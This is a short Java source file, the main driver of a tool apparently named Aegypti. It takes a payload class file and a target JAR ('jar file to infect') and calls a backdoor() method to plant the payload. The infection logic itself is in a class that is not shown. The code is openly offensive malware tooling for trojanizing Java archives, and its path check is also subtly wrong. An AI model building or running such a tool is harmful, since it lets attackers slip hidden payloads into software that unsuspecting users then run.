package io.github.tesla.Aegypti;

public class AegyptiDriver {
		// Function to add a file to a JarOutputStream
	
	// Main function
	public static void main(String[] args) {
		// If the correct amount of arguments has not been given
		if (args.length!=2) {
			// Print an error
			System.err.println("[!] Please run the program again with the correct arguments!\n[*] Usage: java Agypti.jar [payload].class [jar file to infect]");
			// Exit
			System.exit(0);
		}
		// If the arguments are not an absolute path
		if (!args[1].startsWith("/") || !args[1].startsWith("C:\\")) {
			// Warn the user the program might fail
			System.out.println("[-] Warning: you are not using full URLs. This program will most likely fail.");
		}
		AegyptiParasite ap = new AegyptiParasite(args[0], args[1]);
		ap.backdoor();
	}
}
